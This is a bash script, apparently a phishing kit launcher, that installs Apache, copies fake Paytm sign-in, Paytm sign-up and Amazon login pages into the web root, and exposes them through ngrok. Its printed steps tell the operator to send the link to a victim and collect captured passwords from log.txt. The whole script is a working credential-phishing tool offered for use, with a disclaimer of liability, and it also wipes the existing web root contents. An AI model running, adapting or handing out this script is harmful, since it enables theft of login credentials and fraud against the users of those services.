#!/bin/bash
 cat Launch.txt
sleep 4

printf "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \e[101m\e[1;77m:: REQUIREMENT : ROOT! INTERNET! APACHE SERVER! ::\e[0m\n"
printf "                                   \e[210m\e[1;99m:: +++++++ Devolopers assume no liability and are not Responsible ++++++++ ::\e[0m\n"


sleep 6
# spinner
spinlong ()
{
   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#clolors
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
printf "        \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Paytm\e[0m\n"
printf "        \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;37m]\e[0m\e[1;37m Amazone\e[0m\n"


echo -e $white "Enter your Choice"
read Choice
case $Choice in
	1) echo -e $white "(1) Paytm Signin"
	   echo -e $white "(2) Paytm Signup"
		 echo -e $yellow "Enter your option"
		 read option
		 case $option in 
			 1) apt-get install apache2
		            hostnamectl
		systemctl start apache2
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R ngrok /var/www/html/
		cd paytm/
		cp -R * /var/www/html/
		cd /var/www/html/
		chmod +x *
		chmod 7777 *
		sleep 6
		
		
		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++ \e[0m\n"
		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
		sleep 11
		./ngrok http 80
		cd /var/www/html/
		gedit log.txt
		;;
	        2) apt-get install apache2
		hostnamectl
		systemctl start apache2
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R ngrok /var/www/html/
		cd signup/
		cp -R * /var/www/html/
		cd /var/www/html/
		chmod +x *
		chmod 7777 *
		sleep 6
		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++++ \e[0m\n"
		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 2 - All Password Sve on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
		sleep 11
		./ngrok http 80 
		cd /var/www/html/
		gedit log.txt
		;;
                esac
                ;;
	2)printf "                                                      \e[201m\e[1;33m :: WELCOME TO AMAZONE PHISING PAGE :: \e[0m\n"
		apt-get install apache2
		hostnamectl
		systemctl start apache2
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R ngrok /var/www/html/
		cd amazone/
		cp -R * /var/www/html/
		cd /var/www/html/
		chmod +x *
		chmod 7777 *
		sleep 6
		printf "                                                                                                                                                                                                                         \e[101m\e[1;77m ALERT +++++++++++++++++++ Step 1 - Send Https Link on Victim ++++++++++++++++ \e[0m\n"
		printf "                                                                                                                                                                                                                         \e[101m\e[1;77m ALERT +++++++++++++++++++ Step 2 - All Password Save on /var/www/html/log.txt ++++++++++++ \e[0m\n"
		sleep 11
		./ngrok http 80
                cd /var/www/html/
		gedit log.txt
		;;
	
esac



	 

